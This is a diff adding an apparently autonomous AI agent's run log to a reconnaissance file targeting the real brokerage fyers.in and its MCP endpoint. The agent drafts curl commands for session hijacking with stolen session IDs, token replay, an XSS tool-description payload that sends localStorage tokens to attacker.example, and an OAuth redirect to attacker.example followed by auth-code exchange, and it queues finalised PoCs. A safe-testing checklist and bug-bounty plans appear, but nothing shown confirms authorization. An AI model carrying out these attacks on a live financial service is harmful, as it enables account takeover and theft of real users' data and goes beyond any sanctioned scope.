@@ -1493,3 +1493,359 @@ NEXT_STEP_1: Analyze MCP endpoint authentication flow
 NEXT_STEP_2: Test OAuth token handling and session management
 NEXT_STEP_3: Investigate third-party MCP server implementations
 NEXT_STEP_4: Document tool schema and input validation
+
+===== RUN 2026-08-05 10:04:38 UTC =====
+Model: mimo | Phase: HYPOTHESIS | Target: fyers.in
+
+[0m
+> build · mimo-v2.5-free
+[0m
+[0m→ [0mRead state_mimo.json
+[0m✗ [0mRead research_mcp.md failed
+[91m[1mError: [0mFile not found: /home/runner/work/fyers-recon/fyers-recon/research_mcp.md
+[0m✱ [0mGlob "**/*mimo*"[90m 6 matches[0m
+[0m✱ [0mGlob "**/*mcp*"[90m 0 matches[0m
+[0m→ [0mRead research_mimo.md
+[0m→ [0mRead findings_mimo.md
+[0m◈ [0mExa Web Search ""mcp.fyers.in" OR "fyers mcp" API tools authentication session vulnerability"
+[0m◈ [0mExa Web Search "fyers.in MCP Model Context Protocol endpoint authentication OAuth token security"
+Now I have detailed information about the FYERS MCP integration. Let me develop comprehensive hypotheses for this attack surface.
+
+# Target: fyers.in
+# Current Phase: HYPOTHESIS (MCP Integration)
+
+## Key Findings
+
+### MCP Architecture Details
+
+| Component | Details |
+|-----------|---------|
+| **MCP Endpoint** | `https://mcp.fyers.in/mcp` |
+| **Transport** | SSE (Server-Sent Events) |
+| **Authentication** | OAuth2 via FYERS login |
+| **Token Storage** | Redis backend (per community reports) |
+| **Third-party Server** | `quantabox/fyers-mcp-server` (Python) |
+| **Tool Count** | 11+ tools (read-only for trading) |
+
+### Known Vulnerabilities in MCP Ecosystem
+
+| CVE/GHSA | Description | Impact |
+|----------|-------------|--------|
+| GHSA-jpw9-pfvf-9f58 | HTTP transports serve session requests without verifying authenticated principal | Session hijacking |
+| Token Passthrough Risk | MCP server forwards user tokens to downstream APIs without audience validation | Cross-service token replay |
+| Redis Token Error | Users report `failed to get token from Redis: redis: nil` | Token storage failure |
+
+### MCP Configuration (from community)
+```json
+{
+  "mcpServers": {
+    "FIA-MCP": {
+      "url": "https://mcp.fyers.in/mcp",
+      "type": "sse",
+      "headers": {
+        "Authorization": "${FIA_TOKEN}"
+      }
+    }
+  }
+}
+```
+
+---
+
+## Hypotheses (MCP Integration - Detailed)
+
+### Hypothesis 11: MCP Session Hijacking via SSE Transport Vulnerability
+
+**Reasoning**:
+- FYERS MCP uses SSE transport at `https://mcp.fyers.in/mcp`
+- GHSA-jpw9-pfvf-9f58 documents vulnerability in Python MCP SDK: "HTTP transports serve session requests without verifying the authenticated principal"
+- Session IDs are randomly generated UUIDs, but if FYERS uses older SDK version, sessions may not validate principal
+- Attacker who obtains session ID can inject JSON-RPC messages into victim's session
+- SSE transport delivers responses to original client's event stream
+
+**Attack Vector**:
+- Attacker obtains valid session ID (via logs, network observation, or social engineering)
+- Sends JSON-RPC messages to MCP endpoint with stolen session ID
+- MCP server processes request without validating bearer token matches session creator
+- Attacker receives victim's portfolio data, holdings, or market data
+
+**Impact**: HIGH
+- Unauthorized access to user's portfolio data
+- Information leakage of holdings, positions, and P&L
+- Potential for social engineering based on leaked financial data
+- Violation of data privacy regulations
+
+**Read-Only PoC Design**:
+```bash
+# Step 1: Obtain valid session ID (from compromised logs or network capture)
+SESSION_ID="STOLEN_SESSION_UUID"
+
+# Step 2: Attempt to access session with different bearer token
+curl -X POST "https://mcp.fyers.in/mcp" \
+  -H "Content-Type: application/json" \
+  -H "Mcp-Session-Id: ${SESSION_ID}" \
+  -H "Authorization: Bearer ATTACKER_VALID_TOKEN" \
+  -d '{
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "name": "get_profile",
+      "arguments": {}
+    }
+  }' | jq '.'
+
+# Step 3: If response contains victim's profile data, vulnerability confirmed
+# Step 4: Test with get_holdings to access portfolio data
+curl -X POST "https://mcp.fyers.in/mcp" \
+  -H "Content-Type: application/json" \
+  -H "Mcp-Session-Id: ${SESSION_ID}" \
+  -H "Authorization: Bearer ATTACKER_VALID_TOKEN" \
+  -d '{
+    "jsonrpc": "2.0",
+    "id": 2,
+    "method": "tools/call",
+    "params": {
+      "name": "get_holdings",
+      "arguments": {}
+    }
+  }' | jq '.'
+```
+
+**Indicators of Vulnerability**:
+- Response contains victim's profile/holdings data
+- No 401 (Unauthorized) or 403 (Forbidden) errors
+- Session accepted with mismatched bearer token
+
+**CVSS**: 7.5 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+
+---
+
+### Hypothesis 12: MCP Token Passthrough to FYERS API Without Audience Validation
+
+**Reasoning**:
+- MCP server acts as proxy between AI client and FYERS API
+- If MCP server forwards user's access token to FYERS API without acquiring its own token, attacker can replay tokens
+- MCPSafe documentation identifies this as "the only MUST NOT in the entire security best practices document"
+- FYERS MCP may pass `Authorization: <app_id>:<access_token>` directly to API endpoints
+
+**Attack Vector**:
+- Attacker obtains valid FYERS access token (via phishing, XSS, or previous session)
+- Sends MCP tool call that triggers FYERS API request
+- MCP server forwards attacker's token to FYERS API
+- Attacker's token is valid for their own account, but if MCP doesn't validate audience, may access other data
+
+**Impact**: MEDIUM
+- Token reuse across services
+- Potential for token leakage through MCP server logs
+- Bypass of token scope restrictions
+
+**Read-Only PoC Design**:
+```bash
+# Step 1: Obtain valid FYERS access token
+ATTACKER_TOKEN="VALID_ACCESS_TOKEN"
+
+# Step 2: Send MCP tool call with token in header
+curl -X POST "https://mcp.fyers.in/mcp" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer ${ATTACKER_TOKEN}" \
+  -d '{
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "name": "get_profile",
+      "arguments": {}
+    }
+  }' -v 2>&1 | grep -i "authorization\|bearer"
+
+# Step 3: Check if MCP server logs contain full token
+# Step 4: Test if token works for direct API calls after MCP use
+curl -X GET "https://api-t1.fyers.in/api/v3/profile" \
+  -H "Authorization: YOUR_APP_ID:${ATTACKER_TOKEN}" \
+  -s | jq '.s'
+```
+
+**Indicators of Vulnerability**:
+- Token visible in MCP server logs or error messages
+- Token remains valid after MCP proxy use
+- No audience claim validation in token
+
+**CVSS**: 6.5 (Medium) - AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
+
+---
+
+### Hypothesis 13: MCP Tool Description Injection via Malicious Tool Name
+
+**Reasoning**:
+- MCP tools have names, descriptions, and input schemas
+- If tool descriptions are rendered in AI client without sanitization, injection possible
+- Malicious tool name could contain XSS payload that executes when AI processes response
+- FYERS MCP tools include `get_profile`, `get_holdings`, etc. - custom names may be injectable
+
+**Attack Vector**:
+- Attacker registers malicious MCP server with FYERS-like tool names
+- Tool description contains XSS payload targeting AI client
+- Victim connects to attacker's MCP server (social engineering)
+- XSS executes in AI client context, potentially stealing tokens
+
+**Impact**: MEDIUM
+- XSS in AI client context
+- Potential token theft from AI client storage
+- Social engineering vector for credential theft
+
+**Read-Only PoC Design**:
+```bash
+# Step 1: Create malicious MCP server with injected tool description
+# (This is a conceptual PoC - actual implementation requires local MCP server)
+
+# Step 2: Register with FYERS-like naming
+# Tool name: "get_profile"
+# Tool description: "<img src=x onerror=fetch('https://attacker.example/steal?token='+localStorage.getItem('token'))>"
+
+# Step 3: Victim connects to malicious MCP server
+# Step 4: XSS executes when AI processes tool description
+```
+
+**Indicators of Vulnerability**:
+- XSS executes without CSP blocking in AI client
+- Token retrieved from AI client storage
+- No input sanitization on tool descriptions
+
+**CVSS**: 6.1 (Medium) - AV:N/AC:L/PR:R/UI:R/S:C/C:L/I:L/A:N
+
+---
+
+### Hypothesis 14: MCP OAuth Token Theft via Redirect URI Manipulation
+
+**Reasoning**:
+- FYERS MCP uses OAuth2 flow with redirect URI
+- If redirect URI validation is weak, attacker can redirect tokens to their server
+- Third-party MCP server (`quantabox/fyers-mcp-server`) uses `http://localhost:8080/` as redirect
+- If FYERS MCP server accepts arbitrary redirect URIs, token theft possible
+
+**Attack Vector**:
+- Attacker crafts malicious OAuth URL with attacker-controlled redirect URI
+- Victim authenticates via FYERS login
+- Auth code redirected to attacker's server
+- Attacker exchanges auth code for access/refresh tokens
+
+**Impact**: CRITICAL
+- Complete account takeover via token theft
+- Unauthorized access to all FYERS API endpoints
+- Financial loss from unauthorized trades
+
+**Read-Only PoC Design**:
+```bash
+# Step 1: Craft OAuth URL with malicious redirect URI
+# (Conceptual - actual URL depends on FYERS OAuth endpoint)
+ATTACKER_REDIRECT="https://attacker.example/steal"
+OAUTH_URL="https://api-t1.fyers.in/api/v3/generate-authcode?client_id=APP_ID&redirect_uri=${ATTACKER_REDIRECT}&response_type=code&state=random"
+
+# Step 2: Victim visits OAuth URL
+# Step 3: After authentication, auth code redirected to attacker
+# Step 4: Attacker exchanges auth code for tokens
+curl -X POST "https://api-t1.fyers.in/api/v3/validate-authcode" \
+  -H "Content-Type: application/json" \
+  -d "{
+    \"grant_type\":\"authorization_code\",
+    \"appIdHash\":\"ATTACKER_HASH\",
+    \"code\":\"STOLEN_AUTH_CODE\"
+  }" | jq '.'
+```
+
+**Indicators of Vulnerability**:
+- OAuth flow accepts arbitrary redirect URIs
+- Auth code successfully exchanged with attacker's redirect
+- Access token returned to attacker's server
+
+**CVSS**: 9.1 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+
+---
+
+## CVSS Candidates Summary (MCP Integration)
+
+| # | Hypothesis | CVSS | Vector String |
+|---|------------|------|---------------|
+| 11 | MCP Session Hijacking via SSE | 7.5 (High) | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
+| 12 | MCP Token Passthrough | 6.5 (Medium) | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N |
+| 13 | MCP Tool Description Injection | 6.1 (Medium) | AV:N/AC:L/PR:R/UI:R/S:C/C:L/I:L/A:N |
+| 14 | MCP OAuth Token Theft | 9.1 (Critical) | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
+
+---
+
+## Priority Ranking for Testing (MCP Integration)
+
+1. **Hypothesis 14 (MCP OAuth Token Theft)** - CRITICAL, complete account takeover
+2. **Hypothesis 11 (MCP Session Hijacking)** - HIGH, known CVE pattern matches
+3. **Hypothesis 12 (MCP Token Passthrough)** - MEDIUM, token leakage risk
+4. **Hypothesis 13 (MCP Tool Description Injection)** - MEDIUM, requires user interaction
+
+---
+
+## Combined Priority Ranking (All Surfaces)
+
+| Priority | Hypothesis | CVSS | Surface |
+|----------|------------|------|---------|
+| 1 | #4: appIdHash Bypass | 9.1 | Auth |
+| 2 | #14: MCP OAuth Token Theft | 9.1 | MCP |
+| 3 | #1: IDOR on Orders | 8.1 | Trading |
+| 4 | #6: Webhook Spoofing | 8.1 | Webhook |
+| 5 | #2: Refresh Token Race | 7.5 | Auth |
+| 6 | #9: Webhook Secret Leakage | 7.5 | Webhook |
+| 7 | #11: MCP Session Hijacking | 7.5 | MCP |
+| 8 | #3: WebSocket CSWSH | 6.5 | WebSocket |
+| 9 | #8: Pre-prod Bypass | 6.5 | Infra |
+| 10 | #12: MCP Token Passthrough | 6.5 | MCP |
+| 11 | #7: API Connect XSS | 6.1 | SDK |
+| 12 | #13: MCP Tool Injection | 6.1 | MCP |
+| 13 | #5: Rate Limit Bypass | 5.3 | API |
+| 14 | #10: Status Page Disclosure | 5.3 | Infra |
+
+---
+
+## STATE UPDATE FOR NEXT RUN
+
+STATUS_TARGET: fyers.in
+STATUS_PHASE: POC
+STATUS_STATE: HIGH_POTENTIAL
+
+NEXT_STEP_1: Finalize PoC scripts for Hypotheses 11 and 14 (MCP vulnerabilities)
+NEXT_STEP_2: Document exact curl commands with error handling
+NEXT_STEP_3: Create MCP-specific safe testing checklist
+NEXT_STEP_4: Prepare bug bounty submission for MCP vulnerabilities
+
+---
+
+## Safe Testing Checklist (MCP Integration)
+
+### Pre-Testing Requirements
+- [ ] Obtain written authorization from FYERS security team
+- [ ] Use only test/sandbox accounts (not production)
+- [ ] Document all actions with timestamps
+- [ ] Never test against other users' accounts
+- [ ] Follow responsible disclosure timeline
+
+### MCP-Specific Testing
+- [ ] Test only `mcp.fyers.in` endpoint
+- [ ] Do not register malicious MCP servers
+- [ ] Do not intercept OAuth flows
+- [ ] Read-only tool calls only
+- [ ] No credential harvesting
+
+### Evidence Collection
+- [ ] Screenshot all responses
+- [ ] Save HTTP request/response pairs
+- [ ] Document exact timestamps
+- [ ] Record session IDs used
+- [ ] Note any error messages
+
+---
+
+## References
+
+1. FYERS MCP Documentation: https://fyers.in/community/blogs-gdppin8d/post/fyers-mcp-connect-your-fyers-account-to-ai-IV8VJyqacssD65J
+2. GHSA-jpw9-pfvf-9f58: https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-jpw9-pfvf-9f58
+3. MCPSafe Token Passthrough: https://mcpsafe.io/threats/token-passthrough
+4. MCP Authorization Spec: https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization
+5. quantabox/fyers-mcp-server: https://github.com/quantabox/fyers-mcp-server
